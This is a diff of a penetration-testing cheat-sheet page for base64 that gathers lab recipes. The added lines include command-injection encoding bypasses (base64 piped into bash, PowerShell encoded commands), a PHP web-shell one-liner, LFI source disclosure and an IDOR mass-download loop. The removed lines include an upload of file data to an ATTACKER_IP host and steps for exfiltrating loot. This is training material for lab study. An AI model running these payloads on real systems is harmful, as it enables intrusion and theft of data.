@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/base64.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Decode a captured Base64 blob into a file
+[Search this tool’s saved examples](/commands/notebook?tool=base64) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Decode a captured Base64 blob into a file
 
 **Run in:** Kali with GNU coreutils. **Requires:** A Base64 text file with the intended alphabet and complete encoded data; output path must be writable.
 
@@ -21,123 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 base64 --decode input.b64 > output.bin
 ```
 
-**Read the result:** Use encoding for transport through a text channel, then decode to a file and verify the result.
-
-**If Decoding reports invalid input or output is not the expected format:** Base64 is not encryption. Wrapping, clipboard truncation, newline handling and PowerShell text encoding can alter the bytes.
+**What the result establishes:** Use encoding for transport through a text channel, then decode to a file and verify the result.
 
 **Next check:** Check padding, wrapping and whether the source is URL-safe Base64; identify and hash the decoded file rather than executing it blindly.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://www.gnu.org/software/coreutils/manual/html_node/base64-invocation.html)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## base64: choose the operation and read the result
-
-Encode or decode small files for text-based transfer.
-
-### What the result establishes
-
-Use encoding for transport through a text channel, then decode to a file and verify the result.
-
-### Prerequisites and common failures
-
-Base64 is not encryption. Wrapping, clipboard truncation, newline handling and PowerShell text encoding can alter the bytes.
-
-### Example 1: Commands
-
-Run in: **Kali/Linux**.
-
-```bash
-base64 -w 0 file.zip
-# Decode pasted data into a file
-printf '%s' 'BASE64_TEXT' | base64 -d > file.zip
-```
-
-### Example 2: Base64 Encode & Decode (Upload)
-
-Run in: **Saved lab example**.
-
-```bash
-echo <base64_string> | base64 -d > hosts
-md5sum hosts    # verify hash matches
-```
-
-Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (Upload)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-upload). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Base64 Encode & Decode (No Network Needed)
-
-Run in: **Saved lab example**.
-
-```powershell
-[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<paste base64 here>"))
-```
-
-Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (No Network Needed)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-no-network-needed). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: Base64 Encode & Decode (No Network Needed)
-
-Run in: **Saved lab example**.
-
-```bash
-md5sum id_rsa                        # note the hash to verify later
-cat id_rsa | base64 -w 0; echo      # -w 0 = no line wrapping, one continuous string
-```
-
-Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (No Network Needed)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-no-network-needed). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: PowerShell Web Uploads
-
-Run in: **Saved lab example**.
-
-```powershell
-$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\path\to\file' -Encoding Byte))
-Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
-```
-
-Saved context: [File Transfers for Linux and Windows — PowerShell Web Uploads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-uploads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: Base64 Encode & Decode
-
-Run in: **Saved lab example**.
-
-```bash
-# On attack box — encode
-cat id_rsa | base64 -w 0; echo
-md5sum id_rsa
-
-# On target — decode
-echo -n '<base64_string>' | base64 -d > id_rsa
-md5sum id_rsa    # verify match
-```
-
-Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: Base64 Encode & Decode (Upload)
-
-Run in: **Saved lab example**.
-
-```powershell
-[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
-Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
-```
-
-Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (Upload)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-upload). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Encode or decode small files for text-based transfer.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=base64) · [All tools](/index)
 
 ## Commands
 
@@ -149,11 +43,15 @@ base64 -w 0 file.zip
 printf '%s' 'BASE64_TEXT' | base64 -d > file.zip
 ```
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| Decoding reports invalid input or output is not the expected format | Base64 is not encryption. Wrapping, clipboard truncation, newline handling and PowerShell text encoding can alter the bytes. |
 
 ## Notebook recipes
 
-15 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+33 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -161,7 +59,7 @@ printf '%s' 'BASE64_TEXT' | base64 -d > file.zip
 
 ### Filter bypasses
 
-**Command Injection: Quick Reference**
+**Command Injection**
 
 ```bash
 # spaces
@@ -181,6 +79,110 @@ echo aWQ= | base64 -d | bash
 
 </Accordion>
 
+<Accordion title="Transformations with explicit prerequisites">
+
+### Transformations with explicit prerequisites
+
+**Command Injection**
+
+```bash
+# Bash + rev: reconstruct a small identity command.
+$(rev<<<'imaohw')
+
+# Bash + base64: a local encoding example, followed by its decoding form.
+printf '%s' 'whoami' | base64
+bash<<<$(base64 -d<<<d2hvYW1p)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Transformations with explicit prerequisites](/web/cmdi#transformations-with-explicit-prerequisites)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injection**
+
+```powershell
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
+powershell.exe -NoProfile -EncodedCommand $encoded
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Transformations with explicit prerequisites](/web/cmdi#transformations-with-explicit-prerequisites)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Encoded Commands">
+
+### Encoded Commands
+
+**Command Injections — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
+
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Encoded Commands](/web/htb/command-injections#encoded-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injections — HTB Module**
+
+```powershell
+PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+dwBoAG8AYQBtAGkA
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Encoded Commands](/web/htb/command-injections#encoded-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injections — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+
+dwBoAG8AYQBtAGkA
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Encoded Commands](/web/htb/command-injections#encoded-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injections — HTB Module**
+
+```powershell
+PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+
+21y4d
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Encoded Commands](/web/htb/command-injections#encoded-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Phase 5 — Upgrading to an Interactive Reverse Shell">
 
 ### Phase 5 — Upgrading to an Interactive Reverse Shell
@@ -194,6 +196,120 @@ echo "<base64>" | base64 -d | iconv -f UTF-16LE -t UTF-8
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Common Services: Personal Assessment Notes — Phase 5 — Upgrading to an Interactive Reverse Shell](/modules/common-services/assessment#phase-5-—-upgrading-to-an-interactive-reverse-shell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Checking PHP Configurations">
+
+### Checking PHP Configurations
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+
+allow_url_include = On
+
+Excellent! We see that we have this option enabled, so we can use the data wrapper. Knowing how to check for the allow_url_include option can be very important, as this option is not enabled by default, and is required for several other LFI attacks, like using the input wrapper or for any RFI attack, as we'll see next. It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Checking PHP Configurations](/web/htb/file-inclusion#checking-php-configurations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Expect">
+
+### Expect
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
+
+extension=expect
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Expect](/web/htb/file-inclusion#expect)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Remote Code Execution">
+
+### Remote Code Execution
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
+
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Remote Code Execution](/web/htb/file-inclusion#remote-code-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Source Code Disclosure">
+
+### Source Code Disclosure
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
+
+...SNIP...
+
+if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
+  header('HTTP/1.0 403 Forbidden', TRUE, 403);
+  die(header('location: /index.php'));
+}
+
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Source Code Disclosure](/web/htb/file-inclusion#source-code-disclosure)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Verify RFI">
+
+### Verify RFI
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+
+allow_url_include = On
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Verify RFI](/web/htb/file-inclusion#verify-rfi)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -312,6 +428,50 @@ Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
 
 </Accordion>
 
+<Accordion title="Encoded and hashed object references">
+
+### Encoded and hashed object references
+
+**IDOR and API Authorization**
+
+```bash
+# GNU tools on Kali: no added newline at either stage.
+printf %s '1' | base64 -w 0 | md5sum
+
+# Portable equivalent; this only computes local example values.
+python3 - <<'PY'
+import base64, hashlib
+for object_id in ('1', '2'):
+    encoded = base64.b64encode(object_id.encode())
+    print(object_id, encoded.decode(), hashlib.md5(encoded).hexdigest())
+PY
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IDOR and API Authorization — Encoded and hashed object references](/web/idor#encoded-and-hashed-object-references)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**IDOR and API Authorization**
+
+```bash
+CONTRACT=$(printf %s "$B_ID" | base64 -w 0 | md5sum | cut -d ' ' -f1)
+curl -sS -b "PHPSESSID=$SESSION_A" --data-urlencode "contract=$CONTRACT" \
+  -D evidence/idor/contract.headers -o evidence/idor/contract.bin "$BASE/download.php"
+file evidence/idor/contract.bin
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IDOR and API Authorization — Encoded and hashed object references](/web/idor#encoded-and-hashed-object-references)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="4. Export Cached Tickets with Mimikatz">
 
 ### 4. Export Cached Tickets with Mimikatz
@@ -376,6 +536,30 @@ hashcat -m 19700 aes256_hashes wordlist.txt
 
 </Accordion>
 
+<Accordion title="Read PHP source without executing it">
+
+### Read PHP source without executing it
+
+**LFI / RFI**
+
+```bash
+curl -sS -G \
+  --data-urlencode 'language=php://filter/read=convert.base64-encode/resource=config.php' \
+  "$BASE/index.php" -o config-response.html
+
+# Copy only the returned base64 value into config.b64, then decode it locally.
+base64 -d config.b64 > config.php.txt
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — Read PHP source without executing it](/web/lfi-rfi#read-php-source-without-executing-it)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Step 2b — Inject a stolen/forged ticket (the actual &quot;pass&quot;)">
 
 ### Step 2b — Inject a stolen/forged ticket (the actual "pass")
@@ -409,37 +593,91 @@ Rubeus.exe ptt /ticket:[0;6c680]-2-0-...julio@krbtgt-inlanefreight.htb.kirbi   #
 
 </Accordion>
 
-<Accordion title="Pulling files FROM the target to Kali (the hard direction)">
+<Accordion title="3. Repeater, Decoder, Comparer &amp; Inspector">
 
-### Pulling files FROM the target to Kali (the hard direction)
+### 3. Repeater, Decoder, Comparer & Inspector
 
-**Pivoting and File Transfer: Field Reference**
+**Using Web Proxies (Burp Suite & OWASP ZAP)**
 
 ```bash
-# 1) evil-winrm has it built in (pulls over your existing session):
-*Evil-WinRM* PS> download C:\Temp\lsass.dmp /home/kali/loot/lsass.dmp
-*Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe   # the reverse
-
-# 2) Stage through the DMZ (a host the internal box CAN reach):
-#    run smbserver on DMZ01, push from internal host, then SSH-pull DMZ->Kali
-impacket-smbserver share /tmp -smb2support -username u -password p     # ON DMZ01
-#    on the internal host:
-net use \\172.16.119.13\share /user:u p
-copy C:\Temp\loot.zip \\172.16.119.13\share\
-#    DMZ -> Kali:
-scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
-
-# 3) Reverse forward (ligolo listener_add or chisel/ssh -R), then smbserver/nc ON Kali
-#    becomes reachable from inside, push to it normally.
-
-# 4) base64 paste (small files / when nothing else works):
-#    Windows:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\x")) | clip
-#    Kali:     echo '<paste>' | base64 -d > x
+# CLI equivalent for quick multi-stage token inspection
+echo -n 'eyJ1c2VyIjoiZ3Vlc3QifQ==' | base64 -d
+printf 'admin' | xxd -p
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction)
+**Original note sections:** [Using Web Proxies (Burp Suite & OWASP ZAP) — 3. Repeater, Decoder, Comparer & Inspector](/web/web-proxies#3-repeater-decoder-comparer-&-inspector)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Function Disclosure">
+
+### Function Disclosure
+
+**Web Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum
+
+cdd96d3cc73d1dbdaffa03cc6cd7339b -
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Function Disclosure](/web/htb/web-attacks#function-disclosure)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Mass Enumeration">
+
+### Mass Enumeration
+
+**Web Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
+
+cdd96d3cc73d1dbdaffa03cc6cd7339b
+0b7e7dee87b1c3b98e72131173dfbbbf
+0b24df25fe628797b3a50ae0724d2730
+f7947d50da7a043693a592b4db43b0a1
+8b9af1f7f76daf0f02bd9c48c4a2e3d0
+006d1236aee3f92b8322299796ba1989
+b523ff8d1ced96cef9c86492e790c2fb
+d477819d240e7d3dd9499ed8d23e7158
+3e57e65a34ffcb2e93cb545d024f5bde
+5d4aace023dc088767b4e08c79415dcd
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Web Attacks — HTB Module**
+
+```bash
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration-2)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -466,7 +704,32 @@ SecretSecurePassword1234*
 
 </Accordion>
 
+<Accordion title="PHP source and base64 filters">
+
+### PHP source and base64 filters
+
+**XXE: XML External Entity Injection**
+
+```bash
+# Save only the returned base64 value, without the surrounding HTML/message.
+printf %s 'PASTE_BASE64_VALUE' | base64 --decode > evidence/xxe/source.php
+sed -n '1,100p' evidence/xxe/source.php
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [XXE: XML External Entity Injection — PHP source and base64 filters](/web/xxe#php-source-and-base64-filters)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 </AccordionGroup>
+
+## Related tools and references
+
+- [Official documentation 1](https://www.gnu.org/software/coreutils/manual/html_node/base64-invocation.html)
 
 {/* VAULT_RELATED_START */}
 
@@ -475,5 +738,3 @@ SecretSecurePassword1234*
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
